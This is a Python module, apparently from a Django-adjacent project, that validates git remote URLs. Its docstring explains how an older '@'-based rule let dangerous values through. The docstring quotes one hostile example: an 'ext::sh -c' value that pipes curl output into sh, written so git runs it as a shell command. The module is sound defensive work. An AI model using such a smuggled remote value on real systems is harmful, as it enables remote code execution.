"""What may be stored as a remote URL, and why the old rule was dangerous.

## The rule this replaces

``connect_remote`` used to accept a URL if it began with a known scheme **or
contained an ``@``**::

    if not (url.startswith(("http://", "https://", "git://", "ssh://"))
            or "@" in url):
        raise RepoError("that does not look like a git remote URL")

The second arm was meant to admit the scp form, ``git@github.com:me/thing.git``.
What it actually admitted was **any string containing an ``@``** — including
``ext::sh -c 'curl http://x/y | sh' @``.

``ext::`` is one of git's transport helpers, and it does exactly what it says:
git runs the rest of the value **as a shell command** and speaks the pack
protocol over its stdio. Stored on ``GitRepo.remote_url``, written into
``.git/config`` by ``git remote add``, and then executed on the next fetch or
push. Git's default ``protocol.ext.allow=user`` permits it for a direct
invocation, which is what a push is. That is remote code execution reachable
from a text field, gated only by ``REPO_ACCESS``.

## The rule now

An **allowlist of forms**, not a blocklist of prefixes — a blocklist has to
enumerate every transport helper git has or will ever gain, and would be wrong
the first time one is added.

Accepted:

* ``https://host/path``, ``http://host/path``
* ``ssh://[user@]host[:port]/path``
* ``git://host/path``
* the scp form, ``[user@]host:path``

Everything else is refused, including ``file://`` and bare local paths (a
worktree is not a place to fetch from — see the symlink note in ``git_cli``),
anything beginning with ``-`` (which git would read as an option), and anything
carrying a ``helper::`` prefix.

This module is deliberately Django-free so it can be tested without a database
and reused by anything that needs the same answer.
"""

from __future__ import annotations

import re
from urllib.parse import urlsplit

#: Long enough for a real forge URL, short enough not to be a payload.
MAX_URL_LENGTH = 500

#: Schemes git can fetch over that do not hand it a command to run.
SAFE_SCHEMES = ("https", "http", "ssh", "git")

#: ``helper::rest`` — git's transport-helper syntax, of which ``ext::`` is the
#: dangerous one. Matched on the whole class rather than on ``ext`` alone: the
#: point is that a URL may not name a transport at all.
_HELPER = re.compile(r"^[A-Za-z0-9][A-Za-z0-9+.-]*::")

#: ``[user@]host:path`` — the scp form. No scheme, exactly one colon before the
#: path, and a host that looks like a host. The path may not start with ``/``
#: (that would be ``host:/abs`` which git reads as scp too, but which nothing
#: legitimate here produces) and may not be empty.
_SCP = re.compile(
    r"^(?:[A-Za-z0-9._~+-]+@)?"        # optional user@
    r"(?:[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?\.)*"  # optional sub.domains.
    r"[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?"         # host label
    r":"
    r"[A-Za-z0-9._~/-][A-Za-z0-9._~/-]*$"               # path, no colon again
)

#: Anything in this range would be a lie about where a URL ends — a newline in
#: particular, which could smuggle a second config line.
_CONTROL = re.compile(r"[\x00-\x20\x7f]")


class InvalidRemoteURL(ValueError):
    """A remote URL that will not be stored. The message is user-facing."""


def validate_remote_url(url: str) -> str:
    """Return the URL unchanged, or raise :class:`InvalidRemoteURL`.

    Never rewrites: a URL that needs correcting is one the user should see and
    fix, not one this function should guess at.
    """
    url = (url or "").strip()
    if not url:
        raise InvalidRemoteURL("a remote URL is required")
    if len(url) > MAX_URL_LENGTH:
        raise InvalidRemoteURL(
            f"that URL is longer than {MAX_URL_LENGTH} characters")
    # Checked BEFORE the control-character rule, purely for the message: the
    # exploit payload carries spaces, so it would otherwise be refused as
    # "contains spaces" — true, but it tells the reader nothing about why a URL
    # git would happily accept is not allowed here.
    if _HELPER.match(url):
        raise InvalidRemoteURL(
            "remote helpers such as “ext::” are not allowed — they run a "
            "command rather than fetching over the network. Use an https:// "
            "or ssh:// URL."
        )
    if _CONTROL.search(url):
        raise InvalidRemoteURL(
            "a remote URL may not contain spaces or control characters")
    if url.startswith("-"):
        # git would read it as an option rather than a URL.
        raise InvalidRemoteURL("a remote URL may not begin with “-”")

    scheme = urlsplit(url).scheme.lower()
    if scheme in SAFE_SCHEMES:
        parts = urlsplit(url)
        if not parts.hostname:
            raise InvalidRemoteURL("that URL names no host")
        return url

    # The helper case is already refused above, with its own message.
    if scheme:
        raise InvalidRemoteURL(
            f"“{scheme}://” is not a supported transport. Use "
            f"{', '.join(s + '://' for s in SAFE_SCHEMES)} or the "
            f"user@host:path form."
        )
    if _SCP.match(url):
        return url
    raise InvalidRemoteURL("that does not look like a git remote URL")
